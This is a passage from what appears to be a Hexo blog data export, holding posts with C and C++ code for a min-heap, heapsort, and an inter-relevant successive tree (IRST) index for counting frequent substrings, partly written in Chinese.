class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAX 1000</span></span><br><span class=\"line\"><span class=\"keyword\">void</span> swap(<span class=\"keyword\">int</span> * a,<span class=\"keyword\">int</span> * b)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> tmp = *a;</span><br><span class=\"line\">    *a = *b;</span><br><span class=\"line\">    *b = tmp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> siftdown(<span class=\"keyword\">int</span> * <span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> n,<span class=\"keyword\">int</span> root)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> sift = root;</span><br><span class=\"line\">    <span class=\"built_in\">while</span>(root &lt; n)&#123;</span><br><span class=\"line\">        sift = root &lt;&lt; <span class=\"number\">1</span> | <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(sift + <span class=\"number\">1</span> &lt; n &amp;&amp; <span class=\"built_in\">line</span>[sift + <span class=\"number\">1</span>] &lt; <span class=\"built_in\">line</span>[sift]) ++ sift;</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(sift &lt; n &amp;&amp; <span class=\"built_in\">line</span>[root] &gt; <span class=\"built_in\">line</span>[sift]) &#123;</span><br><span class=\"line\">            swap(&amp;<span class=\"built_in\">line</span>[root], &amp;<span class=\"built_in\">line</span>[sift]);</span><br><span class=\"line\">            root = sift;</span><br><span class=\"line\">        &#125;<span class=\"built_in\">else</span> <span class=\"built_in\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> heapify(<span class=\"keyword\">int</span> * <span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> n)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> now = (n - <span class=\"number\">2</span>) &gt;&gt; <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = now;i &gt;= <span class=\"number\">0</span>;-- i)&#123;</span><br><span class=\"line\">        siftdown(<span class=\"built_in\">line</span>, n, i);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> del(<span class=\"keyword\">int</span> * <span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> n)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">line</span>[<span class=\"number\">0</span>] = <span class=\"built_in\">line</span>[n - <span class=\"number\">1</span>];</span><br><span class=\"line\">    siftdown(<span class=\"built_in\">line</span>, n - <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> siftup(<span class=\"keyword\">int</span> * <span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> n)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> sift = n;</span><br><span class=\"line\">    <span class=\"built_in\">while</span>(n)&#123;</span><br><span class=\"line\">        sift = (n - <span class=\"number\">1</span>) &gt;&gt; <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(<span class=\"built_in\">line</span>[sift] &gt; <span class=\"built_in\">line</span>[n]) swap(&amp;<span class=\"built_in\">line</span>[sift],&amp;<span class=\"built_in\">line</span>[n]), n = sift;</span><br><span class=\"line\">        <span class=\"built_in\">else</span> <span class=\"built_in\">break</span>; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> insert(<span class=\"keyword\">int</span> * <span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> n, <span class=\"keyword\">int</span> a)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">line</span>[n] = a;</span><br><span class=\"line\">    siftup(<span class=\"built_in\">line</span>, n);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> output(<span class=\"keyword\">int</span> * <span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> n)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; n;++ i) printf(<span class=\"string\">\"%d \"</span>,<span class=\"built_in\">line</span>[i]);</span><br><span class=\"line\">    printf(<span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">int</span> main()&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> n,tmp;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">line</span>[MAX];</span><br><span class=\"line\">    scanf(<span class=\"string\">\"%d\"</span>,&amp;n);</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; n;++ i)&#123;</span><br><span class=\"line\">        scanf(<span class=\"string\">\"%d\"</span>,&amp;<span class=\"built_in\">line</span>[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    heapify(<span class=\"built_in\">line</span>, n);</span><br><span class=\"line\">    output(<span class=\"built_in\">line</span>, n);</span><br><span class=\"line\">    printf(<span class=\"string\">\"1 a for insert a, 0 for delete the heap top\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">while</span>(<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">        scanf(<span class=\"string\">\"%d\"</span>,&amp;tmp);</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(tmp)&#123;</span><br><span class=\"line\">            scanf(<span class=\"string\">\"%d\"</span>,&amp;tmp);</span><br><span class=\"line\">            insert(<span class=\"built_in\">line</span>, n ++, tmp);</span><br><span class=\"line\">        &#125;<span class=\"built_in\">else</span> <span class=\"built_in\">if</span>(n &gt; <span class=\"number\">0</span>) del(<span class=\"built_in\">line</span>, n --);</span><br><span class=\"line\">        <span class=\"built_in\">else</span> printf(<span class=\"string\">\"No number left\\n\"</span>);</span><br><span class=\"line\">        output(<span class=\"built_in\">line</span>, n);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"Heapsort","date":"2015-10-17T13:36:32.000Z","_content":"Heap sort? What? You choose this?\nI don't know why I choose heapsort. Maybe I just want to practise how to write something about heap.\nIf you want to know how it works, go to Wiki, or Baidu, or Google. \nIt's just my implement. \nWe can see that heapsort may have more actions compared with quicksort. But heapsort is always $O(n * log_2n)$, while quicksort may cause a $O(n^2)$. Especially I'm always in bad luck. T.T\nHere is my code:\n<!--more-->\n```\n#include <stdio.h>\n#include <string.h>\n#define MAX 10000\nvoid swap(int *a,int *b){\n    int tmp = *b;\n    *b = *a;\n    *a = tmp;\n}\nvoid siftdown(int * line, int root, int end){\n    int tmp;\n    while(root < end){\n        tmp = root << 1 | 1;\n        if(tmp >= end) return ;\n        if(tmp + 1 < end && line[tmp + 1] > line[tmp]) ++ tmp;\n        if(line[tmp] > line[root]){\n            swap(&line[tmp],&line[root]);\n            root = tmp;\n        }else return ;\n    }\n}\n\nvoid heapify(int * line, int n){\n    for(int i = (n - 2) >> 1;i >= 0;-- i)\n        siftdown(line, i, n);\n}\n\nint * heapsort(int *line, int n){\n    heapify(line, n);\n    for(int i = n - 1;i >= 0;-- i){\n        swap(&line[i],&line[0]);\n        siftdown(line, 0, i);\n    }\n    return line;\n}\nint main(){\n    int n;\n    int line[MAX];\n    scanf(\"%d\",&n);\n    for(int i = 0;i < n;++ i){\n        scanf(\"%d\",&line[i]);\n    }\n    heapsort(line, n);\n    for(int i = 0;i < n;++ i) printf(\"%d \",line[i]);\n    return 0;\n}\n\n```\n","source":"_posts/Heapsort.md","raw":"title: \"Heapsort\"\ndate: 2015-10-17 13:36:32\ntags: Algorithm\n---\nHeap sort? What? You choose this?\nI don't know why I choose heapsort. Maybe I just want to practise how to write something about heap.\nIf you want to know how it works, go to Wiki, or Baidu, or Google. \nIt's just my implement. \nWe can see that heapsort may have more actions compared with quicksort. But heapsort is always $O(n * log_2n)$, while quicksort may cause a $O(n^2)$. Especially I'm always in bad luck. T.T\nHere is my code:\n<!--more-->\n```\n#include <stdio.h>\n#include <string.h>\n#define MAX 10000\nvoid swap(int *a,int *b){\n    int tmp = *b;\n    *b = *a;\n    *a = tmp;\n}\nvoid siftdown(int * line, int root, int end){\n    int tmp;\n    while(root < end){\n        tmp = root << 1 | 1;\n        if(tmp >= end) return ;\n        if(tmp + 1 < end && line[tmp + 1] > line[tmp]) ++ tmp;\n        if(line[tmp] > line[root]){\n            swap(&line[tmp],&line[root]);\n            root = tmp;\n        }else return ;\n    }\n}\n\nvoid heapify(int * line, int n){\n    for(int i = (n - 2) >> 1;i >= 0;-- i)\n        siftdown(line, i, n);\n}\n\nint * heapsort(int *line, int n){\n    heapify(line, n);\n    for(int i = n - 1;i >= 0;-- i){\n        swap(&line[i],&line[0]);\n        siftdown(line, 0, i);\n    }\n    return line;\n}\nint main(){\n    int n;\n    int line[MAX];\n    scanf(\"%d\",&n);\n    for(int i = 0;i < n;++ i){\n        scanf(\"%d\",&line[i]);\n    }\n    heapsort(line, n);\n    for(int i = 0;i < n;++ i) printf(\"%d \",line[i]);\n    return 0;\n}\n\n```\n","slug":"Heapsort","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681um000owypdg4jovsi3","content":"<p>Heap sort? What? You choose this?<br>I don’t know why I choose heapsort. Maybe I just want to practise how to write something about heap.<br>If you want to know how it works, go to Wiki, or Baidu, or Google.<br>It’s just my implement.<br>We can see that heapsort may have more actions compared with quicksort. But heapsort is always $O(n * log_2n)$, while quicksort may cause a $O(n^2)$. Especially I’m always in bad luck. T.T<br>Here is my code:<br><a id=\"more\"></a><br><figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAX 10000</span></span><br><span class=\"line\"><span class=\"keyword\">void</span> swap(<span class=\"keyword\">int</span> *a,<span class=\"keyword\">int</span> *b)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> tmp = *b;</span><br><span class=\"line\">    *b = *a;</span><br><span class=\"line\">    *a = tmp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> siftdown(<span class=\"keyword\">int</span> * <span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> root, <span class=\"keyword\">int</span> <span class=\"built_in\">end</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> tmp;</span><br><span class=\"line\">    <span class=\"built_in\">while</span>(root &lt; <span class=\"built_in\">end</span>)&#123;</span><br><span class=\"line\">        tmp = root &lt;&lt; <span class=\"number\">1</span> | <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(tmp &gt;= <span class=\"built_in\">end</span>) <span class=\"built_in\">return</span> ;</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(tmp + <span class=\"number\">1</span> &lt; <span class=\"built_in\">end</span> &amp;&amp; <span class=\"built_in\">line</span>[tmp + <span class=\"number\">1</span>] &gt; <span class=\"built_in\">line</span>[tmp]) ++ tmp;</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(<span class=\"built_in\">line</span>[tmp] &gt; <span class=\"built_in\">line</span>[root])&#123;</span><br><span class=\"line\">            swap(&amp;<span class=\"built_in\">line</span>[tmp],&amp;<span class=\"built_in\">line</span>[root]);</span><br><span class=\"line\">            root = tmp;</span><br><span class=\"line\">        &#125;<span class=\"built_in\">else</span> <span class=\"built_in\">return</span> ;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> heapify(<span class=\"keyword\">int</span> * <span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> n)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = (n - <span class=\"number\">2</span>) &gt;&gt; <span class=\"number\">1</span>;i &gt;= <span class=\"number\">0</span>;-- i)</span><br><span class=\"line\">        siftdown(<span class=\"built_in\">line</span>, i, n);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> * heapsort(<span class=\"keyword\">int</span> *<span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> n)&#123;</span><br><span class=\"line\">    heapify(<span class=\"built_in\">line</span>, n);</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = n - <span class=\"number\">1</span>;i &gt;= <span class=\"number\">0</span>;-- i)&#123;</span><br><span class=\"line\">        swap(&amp;<span class=\"built_in\">line</span>[i],&amp;<span class=\"built_in\">line</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\">        siftdown(<span class=\"built_in\">line</span>, <span class=\"number\">0</span>, i);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"built_in\">line</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">int</span> main()&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> n;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">line</span>[MAX];</span><br><span class=\"line\">    scanf(<span class=\"string\">\"%d\"</span>,&amp;n);</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; n;++ i)&#123;</span><br><span class=\"line\">        scanf(<span class=\"string\">\"%d\"</span>,&amp;<span class=\"built_in\">line</span>[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    heapsort(<span class=\"built_in\">line</span>, n);</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; n;++ i) printf(<span class=\"string\">\"%d \"</span>,<span class=\"built_in\">line</span>[i]);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n","excerpt":"<p>Heap sort? What? You choose this?<br>I don’t know why I choose heapsort. Maybe I just want to practise how to write something about heap.<br>If you want to know how it works, go to Wiki, or Baidu, or Google.<br>It’s just my implement.<br>We can see that heapsort may have more actions compared with quicksort. But heapsort is always $O(n * log_2n)$, while quicksort may cause a $O(n^2)$. Especially I’m always in bad luck. T.T<br>Here is my code:<br>","more":"<br><figure class=\"highlight arduino\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAX 10000</span></span><br><span class=\"line\"><span class=\"keyword\">void</span> swap(<span class=\"keyword\">int</span> *a,<span class=\"keyword\">int</span> *b)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> tmp = *b;</span><br><span class=\"line\">    *b = *a;</span><br><span class=\"line\">    *a = tmp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">void</span> siftdown(<span class=\"keyword\">int</span> * <span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> root, <span class=\"keyword\">int</span> <span class=\"built_in\">end</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> tmp;</span><br><span class=\"line\">    <span class=\"built_in\">while</span>(root &lt; <span class=\"built_in\">end</span>)&#123;</span><br><span class=\"line\">        tmp = root &lt;&lt; <span class=\"number\">1</span> | <span class=\"number\">1</span>;</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(tmp &gt;= <span class=\"built_in\">end</span>) <span class=\"built_in\">return</span> ;</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(tmp + <span class=\"number\">1</span> &lt; <span class=\"built_in\">end</span> &amp;&amp; <span class=\"built_in\">line</span>[tmp + <span class=\"number\">1</span>] &gt; <span class=\"built_in\">line</span>[tmp]) ++ tmp;</span><br><span class=\"line\">        <span class=\"built_in\">if</span>(<span class=\"built_in\">line</span>[tmp] &gt; <span class=\"built_in\">line</span>[root])&#123;</span><br><span class=\"line\">            swap(&amp;<span class=\"built_in\">line</span>[tmp],&amp;<span class=\"built_in\">line</span>[root]);</span><br><span class=\"line\">            root = tmp;</span><br><span class=\"line\">        &#125;<span class=\"built_in\">else</span> <span class=\"built_in\">return</span> ;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span> heapify(<span class=\"keyword\">int</span> * <span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> n)&#123;</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = (n - <span class=\"number\">2</span>) &gt;&gt; <span class=\"number\">1</span>;i &gt;= <span class=\"number\">0</span>;-- i)</span><br><span class=\"line\">        siftdown(<span class=\"built_in\">line</span>, i, n);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> * heapsort(<span class=\"keyword\">int</span> *<span class=\"built_in\">line</span>, <span class=\"keyword\">int</span> n)&#123;</span><br><span class=\"line\">    heapify(<span class=\"built_in\">line</span>, n);</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = n - <span class=\"number\">1</span>;i &gt;= <span class=\"number\">0</span>;-- i)&#123;</span><br><span class=\"line\">        swap(&amp;<span class=\"built_in\">line</span>[i],&amp;<span class=\"built_in\">line</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\">        siftdown(<span class=\"built_in\">line</span>, <span class=\"number\">0</span>, i);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"built_in\">line</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">int</span> main()&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> n;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> <span class=\"built_in\">line</span>[MAX];</span><br><span class=\"line\">    scanf(<span class=\"string\">\"%d\"</span>,&amp;n);</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; n;++ i)&#123;</span><br><span class=\"line\">        scanf(<span class=\"string\">\"%d\"</span>,&amp;<span class=\"built_in\">line</span>[i]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    heapsort(<span class=\"built_in\">line</span>, n);</span><br><span class=\"line\">    <span class=\"built_in\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>;i &lt; n;++ i) printf(<span class=\"string\">\"%d \"</span>,<span class=\"built_in\">line</span>[i]);</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>"},{"title":"IRST","date":"2015-02-09T00:46:28.000Z","_content":"##开篇##\nIRST,互关联后继树，是国内胡运发教授根据序列字符的有序性和冗余性提出的一种新型的**海量全文存储,索引**模型。因为刚刚写了一个关于这个的东西，暂且学习学习这是个什么东西吧。\n<!--more-->\n##说明##\n前驱后继的概念不解释了。重点是我觉得这种树很有意思。理论什么的一句都不说，直接上例子。\n![](/image/20150209005007.png)\n\n大体解释一下这个例子吧。全文是abcabaabc，首先从a开始，下边走第一个分支是(b,1)，表示下边一个字符是b开头的树的第一个分支，我们来到根为b的这个树，看到第一个分支是(c,1)，说明下一个是c为根的第一个分支，所以就是走到c树，看到第一个分支是(a,2)，说明下一个字符是a的第二个分支，然后我们来到了a的第二个分支，发现是(b,2)，说明下一个是b的第二个分支。以此类推。\n\n这么做有什么好处呢？我们来看看这个树首先干了什么吧。所谓**互关联后继树**，他就是一颗后继树。说白了呢就是标明了每个字符位置的后继位置。用二元组的方式，标出了后继字符在这个字符的第几次出现。假如说是a为根的树，下边有一个(b,2)，就说明现在这个位置，下一个字符是b，而且这个b是全文第二个b。\n\n这样子下来呢，就很容易找到某个字符一共出现了多少次（树的叶子节点的大小），以及后继结点的标号以及出现在什么位置。甚至进一步的运用，可以涉及到识别字串出现的次数。\n\n这里先说一下具体生成这棵树的方法。\n\n![](/image/20150209005837.png)\n![](/image/20150209005849.png)\n\n具体代码实现的时候会有点变化。因为我在写代码的时候发现先做第四步，在前驱节点树的节点添加会更快捷方便。所以我的代码写成了这样。\n\n```\nwhile(!input.eof()){\n        input >> N[i].length >> N[i].data;\n        //添加到上一个节点树\n        if(i){\n            temp = get(N[i - 1].data);\n            SI[temp].child[SI[temp].child.size() - 1].data = N[i].data;\n            if(get(N[i].data) != -1) SI[temp].child[SI[temp].child.size() - 1].pos = SI[get(N[i].data)].child.size();\n            else SI[temp].child[SI[temp].child.size() - 1].pos = 0;\n        }\n        // 添加本节点树\n        if(get(N[i].data) == -1){\n            TSI.child.clear();\n            TSI.id = N[i].data;\n            SI[cnt ++] = TSI;\n        }\n\n        temp = get(N[i].data);\n        TNo.length = N[i].length;\n        TNo.data = -1;\n        TNo.pos = -1;\n        SI[temp].child.push_back(TNo);\n        ++ i;\n}\n```\n这个代码呐，一会会放出能运行的完整版本。先凑合看吧。\n\n##具体应用##\n这里重点记录一个应用，就是说寻找所谓的频繁因子吧。别管这个因子是什么。能寻找出频繁存在的串。\n\n这种东西，借鉴一下一个概念，所谓SIRST，**时序互关联后继树**，听起来如何的高大上，其实道理很简单。就是在IRST的节点二元组(a,1)类似的东西前边，加上一个属于这个二元组的label，我们可以计算出这个label出现的次数大约多少次的串等等。\n\n好处是每个串只需要计算一次。因为我们这样子很轻松的能统计出来串出现的次数。比方说刚刚的例子，我们要统计一下ab这个串出现的次数，只需要从a开始，计算一下孩子结点中b的个数就行了。另外如果要求abc这个串出现的次数，那我们就从a开始，递归的求下去就行了。这里不多说了，从a开始，找到孩子中有b的叶子，假如说是(b,1)(b,2),我们接着去b树里边找1，2分支的，如果有c就继续递归就好了。这样统计字串个数倒是挺简单的。\n\n这里我写的示例程序，主要是解决找label出现次数多余Fmin的子串。不断的递归寻找，最后输出找到的子串以及对应的次数。\n\n目前发现这个奇怪的树的作用也就是找子串出现次数很有意思。\n\n```\n#include <stdio.h>\n#include <vector>\n#include <iostream>\n#include <string.h>\n#include <fstream>\n#include <stdlib.h>\n\n#define MAX 100\nint Fmin = 2;\n\nusing namespace std;\nint cnt = 0;\n\n\nstruct Node{\n    int length;\n    int data;\n    int pos;\n};\n\nstruct SIRST{\n    int id;\n    vector<Node> child;\n};\n\nSIRST SI[MAX];\n\nint get(int data){\n    for(int i = 0;i < cnt;++ i){\n        if(SI[i].id == data) return i;\n    }\n    return -1;\n}\n\nstring getstring(int n){\n    string temp = \"\",temp1 = \"\";\n    while(n){\n        temp1 += (n % 10) + '0';\n        n /= 10;\n    }\n    for(int i = temp1.length() - 1;i >= 0;-- i){\n        temp += temp1[i];\n    }\n    return temp;\n}\n\nvoid getres(string now, vector<int> it, int root){\n    int num_l[MAX];\n    memset(num_l,0,sizeof(num_l));\n    vector<int> next[MAX];\n    string newnow = \"\";\n    int flag = 0;\n    for(int i = 0;i < it.size();++ i){\n        num_l[SI[root].child[it[i]].length] ++;\n    }\n    for(int i = 0;i < MAX - 10 ; ++ i){\n        if(num_l[i] && (num_l[i] >= Fmin)){\n           newnow = now + \"(\";\n           newnow += getstring(i) + ',';\n           newnow += getstring(SI[root].id) + ')';\n           cout << newnow << \"  \" << num_l[i] << endl;\n            for(int j = 0;j < it.size();++ j){\n                int temp = it[j];\n                if(SI[root].child[temp].length == i){\n                    next[get(SI[root].child[temp].data)].push_back(SI[root].child[temp].pos);\n                    //cout << \"pos\" << SI[root].child[temp].pos << endl;\n                }\n            }\n            for(int j = 0;j < cnt;++ j){\n                if(next[j].size() >= Fmin){\n                    getres(newnow, next[j], j);\n                }\n                next[j].clear();\n            }\n        }\n    }\n    return ;\n}\n\n\nint main(){\n\n    Node N[1000],TNo;\n    SIRST TSI;\n    int temp;\n    int temp1;\n    printf(\"Please input the Fmin\\n\");\n    scanf(\"%d\",&Fmin);\n    ifstream input;\n    input.open(\"in.txt\");\n    //freopen(\"out.txt\",\"w\",stdout);\n    int i = 0;\n\n    //算法一\n\n    while(!input.eof()){\n        input >> N[i].length >> N[i].data;\n        //添加到上一个节点树\n        if(i){\n            temp = get(N[i - 1].data);\n            SI[temp].child[SI[temp].child.size() - 1].data = N[i].data;\n            if(get(N[i].data) != -1) SI[temp].child[SI[temp].child.size() - 1].pos = SI[get(N[i].data)].child.size();\n            else SI[temp].child[SI[temp].child.size() - 1].pos = 0;\n        }\n        // 添加本节点树\n        if(get(N[i].data) == -1){\n            TSI.child.clear();\n            TSI.id = N[i].data;\n            SI[cnt ++] = TSI;\n        }\n\n        temp = get(N[i].data);\n        TNo.length = N[i].length;\n        TNo.data = -1;\n        TNo.pos = -1;\n        SI[temp].child.push_back(TNo);\n        ++ i;\n    }\n\n    for(int i = 0;i < cnt;++ i){\n        printf(\"%d\\n\",SI[i].id);\n        for(int j = 0;j < SI[i].child.size();++ j){\n            printf(\"(%d,%d,%d) \",SI[i].child[j].length,SI[i].child[j].data,SI[i].child[j].pos == -1 ? -1 : (SI[i].child[j].pos + 1));\n        }\n        printf(\"\\n\");\n    }\n\n\n    //算法二\n    vector<int> VTemp;\n    string STemp = \"\";\n    for(int i = 0;i < cnt;++ i){\n        VTemp.clear();\n        for(int j = 0;j < SI[i].child.size();++ j){\n            VTemp.push_back(j);\n        }\n        getres(STemp,VTemp,i);\n    }\n\n\n    return 0;\n}\n```\n如有问题，欢迎提出。","source":"_posts/IRST.md","raw":"title: IRST\ndate: 2015-02-09 00:46:28\ntags: Algorithm\ncategories: 